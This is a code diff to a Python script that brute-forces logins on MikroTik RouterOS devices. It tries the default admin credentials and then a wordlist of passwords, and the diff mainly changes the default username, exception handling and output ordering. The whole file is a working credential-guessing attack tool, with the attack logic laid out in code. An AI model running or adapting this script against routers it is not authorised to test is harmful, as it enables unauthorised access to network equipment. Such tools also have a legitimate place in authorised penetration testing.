@@ -31,13 +31,12 @@ from docopt import docopt
 import time
 import sys
 import codecs
-import routeros_api
 import pyprind
+import routeros_api
+from routeros_api import exceptions
 
 
 def main(args):
-    print("[*] Starting bruteforce attack...")
-    print("-" * 33 + "\n")
 
     print("[-] Trying with default credentials on RouterOS...")
     success = False
@@ -45,12 +44,14 @@ def main(args):
     try:
         routeros_api.connect(
             args['<TARGET>'],
-            'sadmin',
+            'admin',
             'password'
         )
         success = True
-    except Exception, e:
-        print e
+    except exceptions.RouterOsApiCommunicationError, e:
+        pass
+    except exceptions.RouterOsApiConnectionError, e:
+        raise e
 
     if success:
         alert = "[+] Login successful!!!"
@@ -62,7 +63,10 @@ def main(args):
         print ""
         time.sleep(1)
 
-        print "[-] Trying with passwords in list..."
+        print("[*] Starting bruteforce attack...")
+        print("-" * 33 + "\n")
+
+        print "[-] Trying with passwords in list...\n"
         dict_file = codecs.open(
             args['<DICT>'],
             'rb', encoding='utf-8',
@@ -72,7 +76,11 @@ def main(args):
         psswd_count = dict_file.read().count('\n')
         dict_file.seek(0)
         items = 0
-        my_bar = pyprind.ProgPercent(psswd_count, stream=1, monitor=True)
+        my_bar = pyprind.ProgPercent(
+            psswd_count,
+            stream=1,
+            monitor=True,
+        )
 
         for password in dict_file.readlines():
             password = password.strip('\n\r ')
@@ -88,24 +96,28 @@ def main(args):
                     args['--user'],
                     password
                 )
-                print ""
+                print "\n"
                 alert = "[+] Login successful!!! "
                 alert += "User: " + args['--user'] + ", Password: " + password
                 print alert
                 success = True
                 break
-            except:
+            except exceptions.RouterOsApiCommunicationError, e:
                 pass
-            print ""
+            except exceptions.RouterOsApiConnectionError, e:
+                raise e
+
             if not args['--verbose']:
                 my_bar.update()
             time.sleep(int(args['--seconds']))
 
-        print my_bar
         print ''
         print "[*] ATTACK FINISHED!"
+        print("-" * 33 + "\n")
+
         if not success:
-            print "Try again with a different wordlist."
+            print "Try again with a different wordlist.\n"
+        print my_bar
 
 
 if __name__ == '__main__':
